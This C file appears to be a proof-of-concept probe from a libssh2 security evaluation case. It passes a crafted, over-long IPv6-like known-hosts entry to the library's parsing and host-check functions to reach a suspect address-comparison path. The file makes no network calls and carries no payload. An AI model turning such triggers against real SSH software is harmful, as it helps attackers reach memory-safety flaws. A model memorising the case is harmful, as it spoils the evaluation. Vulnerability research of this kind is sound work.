/*
 * probe.c - known-hosts parsing probe for the libssh2 evaluation case.
 *
 * Drives the public known-hosts API with an attacker-influenced known-hosts
 * line (an overly long colon-hex "IPv6 literal" entry) and a matching
 * check. Uses in-contract inputs only; no network access.
 */

#include <stdio.h>
#include <string.h>

#include <libssh2.h>

/* 54-character colon-hex host pattern: too long to be a valid IPv6
   literal, but shaped like one so the plain-entry matcher takes the
   address-comparison path. */
#define LINE_NAME "1111:2222:3333:4444:5555:6666:7777:8888:9999:aaaa:bbbb"
#define CHECK_HOST "1111:2222:3333:4444:5555:6666:7777:8888:9999:aaaa:ccc1"

#define KEY_B64 "AAAAB3NzaC1yc2EAAAADAQABAAABgQDemoProbeDemoProbeDemo"

int main(void)
{
    const char *line = LINE_NAME " ssh-rsa " KEY_B64;
    const int typemask = LIBSSH2_KNOWNHOST_TYPE_PLAIN |
                         LIBSSH2_KNOWNHOST_KEYENC_BASE64 |
                         LIBSSH2_KNOWNHOST_KEY_SSHRSA;
    LIBSSH2_SESSION *session;
    LIBSSH2_KNOWNHOSTS *hosts;
    int rc;

    if(libssh2_init(0)) {
        fprintf(stderr, "libssh2_init() failed\n");
        return 1;
    }

    session = libssh2_session_init();
    if(!session) {
        fprintf(stderr, "libssh2_session_init() failed\n");
        return 1;
    }

    hosts = libssh2_knownhost_init(session);
    if(!hosts) {
        fprintf(stderr, "libssh2_knownhost_init() failed\n");
        return 1;
    }

    rc = libssh2_knownhost_readline(hosts, line, strlen(line),
                                    LIBSSH2_KNOWNHOST_FILE_OPENSSH);
    if(rc) {
        fprintf(stderr, "libssh2_knownhost_readline() failed: %d\n", rc);
        return 1;
    }

    rc = libssh2_knownhost_check(hosts, CHECK_HOST, KEY_B64,
                                 strlen(KEY_B64), typemask, NULL);
    printf("knownhost check result: %d\n", rc);

    libssh2_knownhost_free(hosts);
    libssh2_session_free(session);
    libssh2_exit();

    return 0;
}
